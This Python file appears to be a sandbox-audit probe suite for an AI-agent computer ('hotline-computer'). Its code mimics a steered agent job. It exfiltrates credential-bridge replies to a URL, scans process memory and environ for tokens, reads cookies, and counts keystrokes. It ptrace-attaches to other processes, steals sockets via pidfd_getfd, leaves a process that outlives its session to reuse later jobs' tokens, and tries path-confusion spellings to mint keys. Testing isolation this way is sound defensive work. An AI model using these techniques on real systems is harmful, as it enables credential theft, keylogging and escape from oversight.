#!/usr/bin/env python3
"""Job-side probes, run inside the container as the agent's own uid, the way a
steered job would. Ported from hl-secret-audit/tools (bridge.py, askme_job.py,
memscan.py) and hl-secret-design/job_probes.sh (X1-X7).

usage: job.py bridge <fill|logins|get|askme> [timeout]   print the raw reply, base64'd
       job.py plain <op>                                  print the raw reply (the tool answer redacts it)
       job.py post <url> [fill|askme]                     ask the bridge and POST the reply to <url>
       job.py memscan <needle>... [--rev <reversed needle>...]  scan hotline* processes' memory
       job.py scan <reversed needle>...                  count job logs and readable /proc/*/environ holding one
       job.py proc                                       the X1-X7 and B6 checks, as key=value lines
       job.py cookies                                    read signed-in cookie rows from the browser profile
       job.py xi2 <seconds>                              count raw key presses seen on the display
       job.py leftover <url> <seconds>                   leave a process behind this job that waits for a
                                                         later job marked J8B=1 and calls <url> with that
                                                         job's stand-in and proxy settings, read from /proc
       job.py pair <url> <me> <other> <seconds>          one of two live jobs (J9=<me>): holds a CONNECT of its
                                                         own open, then calls <url> with the other's proxy
                                                         credential, stand-in or both, and from an address
                                                         aliasing the other's held connection
       job.py mint <url> <tag>                           call key-minting routes on <url> in several spellings
       job.py reach <host> <port>                        every listener and socket this job can reach, by owner
       job.py hold <url> <seconds>                       (J10=A) hold a CONNECT of this job's own open, idle
       job.py borrow <url>                               from another job: ptrace the holder, write its memory,
                                                         take its held connection with pidfd_getfd and use it
Nothing here prints a secret in plain: replies are base64'd so only the harness reads them.
"""
import base64
import ctypes
import ctypes.util
import glob
import hashlib
import json
import os
import socket
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

SOCKS = ["/tmp/hotline-computer/bridge.sock", "/run/hotline-computer/bridge/bridge.sock"]


def b64(s):
    return base64.b64encode(s if isinstance(s, bytes) else s.encode()).decode()


def ask(message, timeout=8):
    last = "NOSOCKET"
    for path in SOCKS:
        s = socket.socket(socket.AF_UNIX)
        s.settimeout(timeout)
        try:
            s.connect(path)
        except Exception as e:
            last = "CONNECT-" + type(e).__name__ + "-" + str(getattr(e, "errno", ""))
            continue
        s.sendall((json.dumps(message) + "\n").encode())
        buf = b""
        try:
            while not buf.endswith(b"\n"):
                chunk = s.recv(65536)
                if not chunk:
                    break
                buf += chunk
        except Exception as e:
            return "TIMEOUT-" + type(e).__name__
        return buf.decode().strip()
    return last


MESSAGES = {
    "fill": {"kind": "fill", "origin": "https://example.test", "name": "EXAMPLE"},
    "logins": {"kind": "logins", "origin": "https://example.test"},
    "get": {"kind": "get", "details": {
        "rpId": "example.test", "challenge": "YXR0YWNrZXItY2hvc2VuLWNoYWxsZW5nZQ", "allowCredentials": [],
        "extensions": {"remoteDesktopClientOverride": {"origin": "https://example.test",
                                                       "sameOriginWithAncestors": True}}}},
    "askme": {"kind": "fill", "origin": "https://example.test", "name": "ASKME"},
}


def bridge(op, timeout):
    print("REPLY", b64(ask(MESSAGES[op], timeout)))


def plain(op):
    print(ask(MESSAGES[op], 8))


def post(url, op):
    reply = ask(MESSAGES[op], 200)
    try:
        urllib.request.urlopen(urllib.request.Request(url, data=reply.encode(), method="POST"), timeout=5).read()
    except Exception as e:
        print("POSTFAIL", type(e).__name__)
    print("DONE")


def unreversed(args):
    """Needles after --rev come reversed, so the command line that carried
    them (kept by the runner that started this job) never holds them."""
    if "--rev" not in args:
        return args
    at = args.index("--rev")
    return args[:at] + [n[::-1] for n in args[at + 1:]]


def scan(needles):
    needles = [n[::-1].encode() for n in needles]
    logs = 0
    for path in glob.glob(os.path.expanduser("~/.hotline/jobs/*/*.log")):
        try:
            data = open(path, "rb").read()
        except Exception:
            continue
        logs += any(n in data for n in needles)
    environ = 0
    for pid in [p for p in os.listdir("/proc") if p.isdigit()]:
        try:
            data = open(f"/proc/{pid}/environ", "rb").read()
        except Exception:
            continue
        environ += any(n in data for n in needles)
    print(f"SCAN logs={logs} environ={environ}")


def memscan(needles):
    needles = [n.encode() for n in unreversed(needles)]
    for pid in [p for p in os.listdir("/proc") if p.isdigit()]:
        try:
            comm = open(f"/proc/{pid}/comm").read().strip()
        except Exception:
            continue
        if not comm.startswith("hotline"):
            continue
        try:
            comm = open(f"/proc/{pid}/cmdline", "rb").read().replace(b"\0", b" ").decode().split()[1]
        except Exception:
            pass
        try:
            maps = open(f"/proc/{pid}/maps").read().splitlines()
            mem = open(f"/proc/{pid}/mem", "rb", 0)
        except Exception as e:
            print(f"MEMSCAN {pid} {comm} DENIED {type(e).__name__}")
            continue
        hits = 0
        for line in maps:
            addr, perm = line.split()[0], line.split()[1]
            if "r" not in perm:
                continue
            start, end = [int(x, 16) for x in addr.split("-")]
            if end - start > 256 * 1024 * 1024:
                continue
            try:
                mem.seek(start)
                buf = mem.read(end - start)
            except Exception:
                continue
            hits += sum(1 for n in needles if n in buf)
        print(f"MEMSCAN {pid} {comm} HITS {hits}")


def readable(path, n=1):
    try:
        with open(path, "rb") as f:
            return len(f.read(n)) > 0
    except Exception:
        return False


def listening():
    """(port, uid) of every TCP socket listening on this computer."""
    out = []
    for table in ("/proc/net/tcp", "/proc/net/tcp6"):
        try:
            rows = open(table).read().splitlines()[1:]
        except Exception:
            continue
        for row in rows:
            f = row.split()
            if len(f) > 7 and f[3] == "0A":
                out.append((int(f[1].rsplit(":", 1)[1], 16), int(f[7])))
    return sorted(set(out))


def proc():
    """X1-X7 and B6. In the split computer (0.13) the service is PID 1 and the
    broker (uid hotline), and the browser that matters is the signed-in one
    (uid signin, DevTools on a pipe); the runner, the general browser and
    their files are the agent's own uid by design, and are only listed. In
    the single-user computer the service and the one browser are as 0.12."""
    service, runner = [], []
    for p in os.listdir("/proc"):
        try:
            cmd = open(f"/proc/{p}/cmdline", "rb").read().split(b"\0")
        except Exception:
            continue
        if p.isdigit() and cmd[0].endswith(b"hotline-computer") and cmd[1:2] in ([b"boot"], [b"__broker"]):
            service.append(p)
        if p.isdigit() and cmd[0].endswith(b"hotline-computer") and cmd[1:2] == [b"__runner"]:
            runner.append(p)
    split = bool(runner)
    general = signed_in = None
    for p in os.listdir("/proc"):
        if p.isdigit():
            try:
                cmd = open(f"/proc/{p}/cmdline", "rb").read().split(b"\0")
            except Exception:
                continue
            line = b" ".join(cmd)
            if b"/chromium" not in line.split(b" ")[0] or b"--type=" in line:
                continue
            if b"--remote-debugging-pipe" in line and b"/var/lib/hotline-computer/signin" in line:
                signed_in = signed_in or p
            elif b"--remote-debugging-port=9222" in line:
                general = general or p
    browser = signed_in if split else general
    # X1: the service's private files
    if split:
        roots = ["/run/hotline-computer/broker", "/run/hotline-computer/bridge", "/var/lib/hotline-computer/signin"]
        files = []
        for root in roots:
            for d, _, names in os.walk(root):
                files += [os.path.join(d, n) for n in names]
        own = [os.path.basename(p) for p in glob.glob("/tmp/hotline-computer/*") if os.path.isfile(p) and readable(p)]
        print("X1", ",".join(p for p in files if os.path.isfile(p) and readable(p)) or "none",
              f"(the agent's own, not counted: {','.join(own) or 'none'})")
    else:
        files = [p for p in glob.glob("/tmp/hotline-computer/*") + glob.glob("/run/hotline-computer/broker/*")
                 if os.path.isfile(p)]
        print("X1", ",".join(os.path.basename(p) for p in files if readable(p)) or "none")
    # X2 / B6: the service's environment and memory; the bearer in any environ
    mine = os.getpid()
    x2e = any(readable(f"/proc/{p}/environ") for p in service)
    x2m = any(readable(f"/proc/{p}/mem") for p in service)
    print("X2", f"environ={x2e} mem={x2m} pids={','.join(service)}")
    tokens = []
    for p in os.listdir("/proc"):
        if p.isdigit() and int(p) != mine:
            try:
                for kv in open(f"/proc/{p}/environ", "rb").read().split(b"\0"):
                    if kv.startswith(b"HOTLINE_COMPUTER_TOKEN="):
                        tokens.append(hashlib.sha256(kv.split(b"=", 1)[1]).hexdigest())
            except Exception:
                pass
    print("B6", ",".join(tokens) or "none")
    # X3 / X4: the browser that holds signed-in sessions
    which = "signed-in" if split else "general"
    if browser:
        print("X3", f"{which} pid={browser} environ={readable(f'/proc/{browser}/environ')} mem={readable(f'/proc/{browser}/mem')}"
              + (f" (general browser pid={general} is the agent's own)" if split and general else ""))
        libc = ctypes.CDLL(None, use_errno=True)
        r = libc.ptrace(16, int(browser), 0, 0)
        err = os.strerror(ctypes.get_errno())
        if r == 0:
            # Attached: let it stop, then detach and continue so the browser is left as found.
            libc.waitpid(int(browser), None, 0x40000000)
            libc.ptrace(17, int(browser), 0, 0)
            os.kill(int(browser), 18)
        print("X4", f"attach={'ok' if r == 0 else 'refused'} {which} pid={browser} {err}")
    else:
        print("X3", f"no{which}browser")
        print("X4", f"no{which}browser")
    # X5: the bridge socket
    res = "refused"
    for path in SOCKS:
        s = socket.socket(socket.AF_UNIX)
        s.settimeout(3)
        try:
            s.connect(path)
            res = "connected " + path
            break
        except Exception as e:
            res = f"refused {type(e).__name__}"
    print("X5", res)
    # X6: every DevTools endpoint a job reaches, whose socket it is, and what
    # its tabs show (base64'd, for the harness to look for a secret in).
    found = []
    for port, uid in listening():
        try:
            v = urllib.request.urlopen(f"http://127.0.0.1:{port}/json/version", timeout=2).read().decode()
        except Exception:
            continue
        if "webSocketDebuggerUrl" not in v:
            continue
        try:
            tabs = urllib.request.urlopen(f"http://127.0.0.1:{port}/json/list", timeout=3).read()
        except Exception:
            tabs = b""
        found.append(f"{port}:uid{uid}:{b64(tabs)}")
    print("X6", "answered " + " ".join(found) if found else "none")
    # X7: signal the service (signal 0 only: it checks permission and kills nothing)
    ok = False
    for p in service:
        try:
            os.kill(int(p), 0)
            ok = True
        except Exception:
            pass
    print("X7", "may-signal" if ok else "refused")


def cookies():
    import shutil
    import sqlite3
    for _ in range(60):
        try:
            shutil.copy(os.path.expanduser("~/.hotline/browser/Default/Cookies"), "/tmp/ck.db")
            rows = sqlite3.connect("/tmp/ck.db").execute(
                "select host_key,length(value),length(encrypted_value) from cookies where host_key like '%example.test'").fetchall()
        except Exception as e:
            print("COOKIES error", type(e).__name__)
            return
        if rows:
            print("COOKIES row", rows)
            return
        time.sleep(1)
    print("COOKIES norow")


def xi2(seconds):
    x11 = ctypes.CDLL(ctypes.util.find_library("X11"))
    xi = ctypes.CDLL(ctypes.util.find_library("Xi"))
    x11.XOpenDisplay.restype = ctypes.c_void_p
    x11.XOpenDisplay.argtypes = [ctypes.c_char_p]
    d = x11.XOpenDisplay(None)
    if not d:
        print("XI2 noconnect")
        return
    x11.XDefaultRootWindow.restype = ctypes.c_ulong
    x11.XDefaultRootWindow.argtypes = [ctypes.c_void_p]
    root = x11.XDefaultRootWindow(d)
    op, ev, er = ctypes.c_int(), ctypes.c_int(), ctypes.c_int()
    x11.XQueryExtension(ctypes.c_void_p(d), b"XInputExtension", ctypes.byref(op), ctypes.byref(ev), ctypes.byref(er))
    maj, mnr = ctypes.c_int(2), ctypes.c_int(0)
    xi.XIQueryVersion(ctypes.c_void_p(d), ctypes.byref(maj), ctypes.byref(mnr))

    class Mask(ctypes.Structure):
        _fields_ = [("deviceid", ctypes.c_int), ("mask_len", ctypes.c_int), ("mask", ctypes.POINTER(ctypes.c_ubyte))]

    bits = (ctypes.c_ubyte * 4)()
    bits[13 >> 3] |= 1 << (13 & 7)  # XI_RawKeyPress
    m = Mask(1, 4, bits)  # XIAllMasterDevices
    xi.XISelectEvents(ctypes.c_void_p(d), ctypes.c_ulong(root), ctypes.byref(m), 1)
    x11.XFlush(ctypes.c_void_p(d))
    print("XI2 listening", flush=True)
    event = ctypes.create_string_buffer(192)
    count = 0
    end = time.time() + float(seconds)
    while time.time() < end:
        while x11.XPending(ctypes.c_void_p(d)):
            x11.XNextEvent(ctypes.c_void_p(d), event)
            if ctypes.c_int.from_buffer(event, 0).value == 35 and x11.XGetEventData(ctypes.c_void_p(d), event):
                if ctypes.c_int.from_buffer(event, 36).value == 13:
                    count += 1
                x11.XFreeEventData(ctypes.c_void_p(d), event)
        time.sleep(0.05)
    print("XI2 rawkeys", count)


def leftover(url, seconds):
    """A process that outlives its job (a new session, so the job's group
    kill misses it), as a program a job started could leave behind. It reads
    a later job's environment from /proc and uses that job's GH_TOKEN
    stand-in through that job's proxy settings. What it got is in
    ~/probe/j8.out: the HTTP status only, never a value."""
    import subprocess
    out = os.path.expanduser("~/probe/j8.out")
    if os.fork():
        print("LEFTOVER started")
        return
    os.setsid()
    if os.fork():
        os._exit(0)
    null = os.open(os.devnull, os.O_RDWR)
    for fd in (0, 1, 2):
        os.dup2(null, fd)
    me = os.getpid()
    end = time.time() + float(seconds)
    # First its own job's authority, after that job ended (A's stand-in and
    # proxy settings, which this process still holds).
    time.sleep(2)
    own = subprocess.run(["curl", "-s", "-m8", "-o", "/dev/null", "-w", "%{http_code}", url + "a",
                          "-H", "Authorization: Bearer " + os.environ.get("GH_TOKEN", "")],
                         capture_output=True, text=True)
    first = f"OWN status={own.stdout.strip() or 'none'} curl={own.returncode}"
    url = url + "b"
    said = "NOVICTIM"
    while time.time() < end and said == "NOVICTIM":
        for pid in [p for p in os.listdir("/proc") if p.isdigit() and int(p) != me]:
            try:
                raw = open(f"/proc/{pid}/environ", "rb").read()
            except Exception:
                continue
            if b"J8B=1" not in raw.split(b"\0"):
                continue
            env = dict(kv.decode(errors="replace").split("=", 1) for kv in raw.split(b"\0") if b"=" in kv)
            if "GH_TOKEN" not in env or "HTTPS_PROXY" not in env:
                continue
            r = subprocess.run(["curl", "-s", "-m8", "-o", "/dev/null", "-w", "%{http_code}", url,
                                "-H", "Authorization: Bearer " + env["GH_TOKEN"]], env=env, capture_output=True, text=True)
            said = f"USED victim={pid} status={r.stdout.strip() or 'none'} curl={r.returncode}"
            break
        time.sleep(0.3)
    with open(out, "w") as f:
        f.write(first + "; " + said + "\n")
    os._exit(0)


def proxy_parts(env):
    """(host, port, credential) of a job's HTTPS_PROXY."""
    u = urllib.parse.urlsplit(env.get("HTTPS_PROXY") or env.get("https_proxy") or "")
    return u.hostname or "127.0.0.1", u.port or 3128, urllib.parse.unquote(u.password or "")


def connect_through(proxy, credential, target, source=None, timeout=8):
    """A CONNECT to `target` (host, port) through `proxy` with `credential`,
    from `source` (address, port) when given. (socket, status line)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    if source:
        s.bind(source)
    s.connect(proxy)
    auth = base64.b64encode(b"job:" + credential.encode()).decode()
    s.sendall(f"CONNECT {target[0]}:{target[1]} HTTP/1.1\r\nHost: {target[0]}:{target[1]}\r\n"
              f"Proxy-Authorization: Basic {auth}\r\n\r\n".encode())
    head = b""
    while b"\r\n\r\n" not in head:
        chunk = s.recv(1)
        if not chunk:
            break
        head += chunk
    return s, head.split(b"\r\n")[0].decode(errors="replace")


def tls_get(s, target, path, token, method="GET", raw_target=None):
    """One request over TLS on a CONNECTed socket, trusting the job's CA
    bundle; answers the status code (or the error's name)."""
    import ssl
    try:
        context = ssl.create_default_context(cafile=os.environ.get("SSL_CERT_FILE"))
        t = context.wrap_socket(s, server_hostname=target[0])
        t.sendall(f"{method} {raw_target or path} HTTP/1.1\r\nHost: {target[0]}:{target[1]}\r\n"
                  f"Authorization: Bearer {token}\r\nContent-Length: 0\r\nConnection: close\r\n\r\n".encode())
        head = b""
        while b"\r\n" not in head:
            chunk = t.recv(4096)
            if not chunk:
                break
            head += chunk
        line = head.split(b"\r\n")[0].split()
        return line[1].decode() if len(line) > 1 else "none"
    except Exception as e:
        return type(e).__name__


def curl(url, token, env):
    import subprocess
    r = subprocess.run(["curl", "-s", "-m8", "-o", "/dev/null", "-w", "%{http_code}", url,
                        "-H", "Authorization: Bearer " + token], env=env, capture_output=True, text=True)
    return f"{r.stdout.strip() or 'none'}/{r.returncode}"


def pair(url, me, other, seconds):
    """One of two jobs running at once, J9=<me> and J9=<other>, each with
    its own stand-in and proxy credential. Each holds a CONNECT of its own
    open to the bound origin (as a long fetch does), finds the other in
    /proc, and calls <url> with: its own (the control), the other's proxy
    credential, the other's stand-in, both, and the other's credential from
    an address that aliases the other's held connection (127.0.0.N, its
    local port), which the proxy's owner check is asked about by port.
    Statuses only, in ~/probe/pair-<me>.out."""
    end = time.time() + float(seconds)
    target = urllib.parse.urlsplit(url)
    target = (target.hostname, target.port or 443)
    proxy_host, proxy_port, mine = proxy_parts(os.environ)
    held, said = connect_through((proxy_host, proxy_port), mine, target)
    rows = [f"HELD {said}"]
    # The same as a file, as if it leaked some other way: where /proc does
    # not give another job's environment, the rest still runs on it.
    leak = os.path.expanduser(f"~/probe/pair-{me}.cred")
    with open(leak + ".tmp", "w") as f:
        json.dump({"HTTPS_PROXY": os.environ.get("HTTPS_PROXY", ""), "GH_TOKEN": os.environ.get("GH_TOKEN", ""),
                   "port": held.getsockname()[1]}, f)
    os.rename(leak + ".tmp", leak)
    victim = None
    source = "environ"
    while time.time() < end and not victim:
        for pid in [p for p in os.listdir("/proc") if p.isdigit() and int(p) != os.getpid()]:
            try:
                raw = open(f"/proc/{pid}/environ", "rb").read()
            except Exception:
                continue
            if f"J9={other}".encode() not in raw.split(b"\0"):
                continue
            env = dict(kv.decode(errors="replace").split("=", 1) for kv in raw.split(b"\0") if b"=" in kv)
            if "GH_TOKEN" in env and "HTTPS_PROXY" in env:
                victim = (int(pid), env)
                break
        theirs_file = os.path.expanduser(f"~/probe/pair-{other}.cred")
        if not victim and os.path.exists(theirs_file) and time.time() > end - float(seconds) + 6:
            victim, source = (None, json.load(open(theirs_file))), "a leaked file (their /proc environ was refused)"
            break
        time.sleep(0.3)
    if not victim:
        rows.append("NOOTHER")
    else:
        pid, theirs = victim
        rows.append("FROM " + source.replace(" ", "_"))
        time.sleep(1.5)  # the other's held connection is open by now
        mine_env = dict(os.environ)
        cred_env = dict(os.environ, HTTPS_PROXY=theirs["HTTPS_PROXY"], https_proxy=theirs["HTTPS_PROXY"])
        rows.append("OWN " + curl(url + f"/f2x-own-{me}", os.environ.get("GH_TOKEN", ""), mine_env))
        rows.append("CRED " + curl(url + f"/f2x-cred-{me}", os.environ.get("GH_TOKEN", ""), cred_env))
        rows.append("STANDIN " + curl(url + f"/f2x-standin-{me}", theirs["GH_TOKEN"], mine_env))
        rows.append("BOTH " + curl(url + f"/f2x-both-{me}", theirs["GH_TOKEN"], cred_env))
        # The other's held connection: its local port, from the socket
        # table and the other job's own descriptors.
        inodes = set()
        for fd in ([] if pid is None else glob.glob(f"/proc/{pid}/task/*/fd/*") + glob.glob(f"/proc/{pid}/fd/*")):
            try:
                link = os.readlink(fd)
            except Exception:
                continue
            if link.startswith("socket:["):
                inodes.add(link[8:-1])
        ports = []
        for row in open("/proc/net/tcp").read().splitlines()[1:]:
            f = row.split()
            if f[2] == f"0100007F:{proxy_port:04X}" and (f[9] in inodes or int(f[1].split(":")[1], 16) == theirs.get("port")):
                ports.append(int(f[1].split(":")[1], 16))
        ports = sorted(set(ports))
        _, _, theirs_cred = proxy_parts(theirs)
        got, tries = "none", 0
        for port in ports:
            for n in range(2, 40):
                tries += 1
                try:
                    s, line = connect_through((proxy_host, proxy_port), theirs_cred, target, ("127.0.0.%d" % n, port))
                except Exception as e:
                    got = type(e).__name__
                    continue
                if " 200 " not in line + " ":
                    got = line.split(" ", 1)[-1][:24]
                    s.close()
                    continue
                got = "connected via 127.0.0.%d, then %s" % (n, tls_get(s, target, f"/f2x-alias-{me}", theirs["GH_TOKEN"]))
                s.close()
                break
            else:
                continue
            break
        rows.append(f"ALIAS ports={ports} tries={tries} last={got}")
    with open(os.path.expanduser(f"~/probe/pair-{me}.out"), "w") as f:
        f.write("; ".join(rows) + "\n")
    while time.time() < end:
        time.sleep(0.5)
    held.close()


MINTING = ["/app/installations/1/access_tokens", "/authorizations", "/APP/Installations/1/access_tokens",
           "/app%2Finstallations/1/access_tokens", "//authorizations", "/x/../authorizations",
           "/authorizations;x", "/authorizations.json", "/%61uthorizations"]


def mint(url, tag):
    """Each key-minting route the delivery refuses, in the spellings a
    server reads as the same route, through this job's own proxy: by curl
    (POST), and by a request target in absolute form after a harmless
    request on the same connection. Statuses only."""
    import subprocess
    rows = []
    for i, path in enumerate(MINTING):
        r = subprocess.run(["curl", "-s", "-m8", "--path-as-is", "-X", "POST", "-o", "/dev/null", "-w", "%{http_code}",
                            url + path + ("&" if "?" in path else "?") + f"m={tag}{i}",
                            "-H", "Authorization: Bearer " + os.environ.get("GH_TOKEN", "")], capture_output=True, text=True)
        rows.append(f"{i}={r.stdout.strip() or 'none'}")
    target = urllib.parse.urlsplit(url)
    target = (target.hostname, target.port or 443)
    host, port, mine = proxy_parts(os.environ)
    try:
        s, line = connect_through((host, port), mine, target)
        absolute = f"https://{target[0]}:{target[1]}/authorizations?m={tag}abs"
        rows.append("abs=" + (tls_get(s, target, "", os.environ.get("GH_TOKEN", ""), "POST", absolute) if " 200 " in line + " " else line))
    except Exception as e:
        rows.append("abs=" + type(e).__name__)
    print("MINT " + " ".join(rows))


def reach(host, port):
    """Every TCP and UDP socket listening on this computer and every unix
    socket accepting connections (paths and abstract names), each tried
    from this job: connected or refused, and whose it is (the table's
    owner for TCP, the peer's credentials for unix). Then the host's
    listener, the allowed way out. One line per endpoint."""
    import pwd
    import struct

    def who(uid):
        try:
            return pwd.getpwuid(uid).pw_name
        except Exception:
            return str(uid)

    def address(hexed, v6):
        a, p = hexed.split(":")
        raw = bytes.fromhex(a)
        if v6:
            ip = socket.inet_ntop(socket.AF_INET6, b"".join(raw[i:i + 4][::-1] for i in range(0, 16, 4)))
        else:
            ip = socket.inet_ntoa(raw[::-1])
        return ip, int(p, 16)

    seen = set()
    for table, v6, kind, state in (("tcp", False, "tcp", "0A"), ("tcp6", True, "tcp", "0A"),
                                   ("udp", False, "udp", "07"), ("udp6", True, "udp", "07")):
        try:
            rows = open(f"/proc/net/{table}").read().splitlines()[1:]
        except Exception:
            continue
        for row in rows:
            f = row.split()
            if f[3] != state:
                continue
            ip, p = address(f[1], v6)
            if (kind, ip, p) in seen:
                continue
            seen.add((kind, ip, p))
            owner = who(int(f[7]))
            if kind == "udp":
                print(f"REACH udp {ip}:{p} owner={owner} bound")
                continue
            to = {"0.0.0.0": "127.0.0.1", "::": "::1"}.get(ip, ip)
            try:
                socket.create_connection((to, p), timeout=2).close()
                result = "connected"
            except Exception as e:
                result = "refused-" + type(e).__name__
            print(f"REACH tcp {ip}:{p} owner={owner} {result}")
    for row in open("/proc/net/unix").read().splitlines()[1:]:
        f = row.split()
        if len(f) < 8 or not int(f[3], 16) & 0x10000:
            continue
        name = f[7]
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM if f[4] == "0001" else socket.SOCK_SEQPACKET)
        s.settimeout(2)
        try:
            s.connect("\0" + name[1:] if name.startswith("@") else name)
            pid, uid, _ = struct.unpack("3i", s.getsockopt(socket.SOL_SOCKET, 17, 12))
            print(f"REACH unix {name} owner={who(uid)} connected")
        except Exception as e:
            print(f"REACH unix {name} owner=? refused-{type(e).__name__}")
        s.close()
    try:
        socket.create_connection((host, int(port)), timeout=4).close()
        print(f"EGRESS {host}:{port} connected")
    except Exception as e:
        print(f"EGRESS {host}:{port} refused-{type(e).__name__}")
    try:
        r = urllib.request.urlopen(urllib.request.Request("http://127.0.0.1:8787/secrets/uses"), timeout=4)
        print(f"DOOR {r.status}")
    except urllib.error.HTTPError as e:
        print(f"DOOR {e.code}")
    except Exception as e:
        print(f"DOOR {type(e).__name__}")


def hold(url, seconds):
    """Job A of X9: a CONNECT to the bound origin with this job's own
    credential, held open and idle, as a long fetch holds one."""
    target = urllib.parse.urlsplit(url)
    target = (target.hostname, target.port or 443)
    host, port, mine = proxy_parts(os.environ)
    held, said = connect_through((host, port), mine, target)
    with open(os.path.expanduser("~/probe/x9-hold.out"), "w") as f:
        f.write(f"HELD fd={held.fileno()} {said}\n")
    time.sleep(float(seconds))
    held.close()


def borrow(url):
    """Job B of X9, as the same user as job A: PTRACE_ATTACH on A's holder,
    a write of one of its own bytes back into its memory through
    /proc/<pid>/mem, and pidfd_getfd of the connection it holds to the
    proxy, which is then used with A's stand-in. Statuses only."""
    libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
    libc.ptrace.argtypes = [ctypes.c_long, ctypes.c_long, ctypes.c_void_p, ctypes.c_void_p]
    victim = None
    for pid in [p for p in os.listdir("/proc") if p.isdigit() and int(p) != os.getpid()]:
        try:
            raw = open(f"/proc/{pid}/environ", "rb").read()
            cmdline = open(f"/proc/{pid}/cmdline", "rb").read()
        except Exception:
            continue
        if b"J10=A" in raw.split(b"\0") and b"hold" in cmdline.split(b"\0"):
            victim = (int(pid), dict(kv.decode(errors="replace").split("=", 1) for kv in raw.split(b"\0") if b"=" in kv))
    if not victim:
        print("X9 NOVICTIM")
        return
    pid, theirs = victim
    rows = []
    if libc.ptrace(16, pid, None, None) == 0:  # PTRACE_ATTACH
        os.waitpid(pid, 0x40000000)  # __WALL
        libc.ptrace(17, pid, None, None)  # PTRACE_DETACH
        rows.append("attach=ok")
    else:
        rows.append("attach=" + os.strerror(ctypes.get_errno()).replace(" ", "-"))
    try:
        start = next(int(line.split("-")[0], 16) for line in open(f"/proc/{pid}/maps") if line.split()[1].startswith("rw"))
        with open(f"/proc/{pid}/mem", "r+b", buffering=0) as mem:
            mem.seek(start)
            byte = mem.read(1)
            mem.seek(start)
            mem.write(byte)
        rows.append("memwrite=ok")
    except Exception as e:
        rows.append("memwrite=" + type(e).__name__)
    target = urllib.parse.urlsplit(url)
    target = (target.hostname, target.port or 443)
    proxy_port = proxy_parts(theirs)[1]
    table = open("/proc/net/tcp").read().splitlines()[1:]
    got = "no-held-socket"
    for fd in os.listdir(f"/proc/{pid}/fd"):
        try:
            link = os.readlink(f"/proc/{pid}/fd/{fd}")
        except Exception:
            continue
        if not link.startswith("socket:[") or not any(
                row.split()[2] == f"0100007F:{proxy_port:04X}" and row.split()[9] == link[8:-1] for row in table):
            continue
        pidfd = libc.syscall(434, pid, 0)  # pidfd_open
        stolen = libc.syscall(438, pidfd, int(fd), 0) if pidfd >= 0 else -1  # pidfd_getfd
        if stolen < 0:
            got = "getfd=" + os.strerror(ctypes.get_errno()).replace(" ", "-")
            break
        s = socket.socket(fileno=stolen)
        s.settimeout(8)
        got = "getfd=ok,then-" + tls_get(s, target, "/x9-borrow", theirs.get("GH_TOKEN", ""))
        break
    rows.append("borrow=" + got)
    print("X9 " + " ".join(rows))


if __name__ == "__main__":
    cmd = sys.argv[1]
    if cmd == "bridge":
        bridge(sys.argv[2], float(sys.argv[3]) if len(sys.argv) > 3 else 8)
    elif cmd == "plain":
        plain(sys.argv[2])
    elif cmd == "post":
        post(sys.argv[2], sys.argv[3] if len(sys.argv) > 3 else "askme")
    elif cmd == "memscan":
        memscan(sys.argv[2:])
    elif cmd == "scan":
        scan(sys.argv[2:])
    elif cmd == "proc":
        proc()
    elif cmd == "cookies":
        cookies()
    elif cmd == "xi2":
        xi2(sys.argv[2])
    elif cmd == "leftover":
        leftover(sys.argv[2], sys.argv[3])
    elif cmd == "pair":
        pair(sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5])
    elif cmd == "mint":
        mint(sys.argv[2], sys.argv[3])
    elif cmd == "reach":
        reach(sys.argv[2], sys.argv[3])
    elif cmd == "hold":
        hold(sys.argv[2], sys.argv[3])
    elif cmd == "borrow":
        borrow(sys.argv[2])
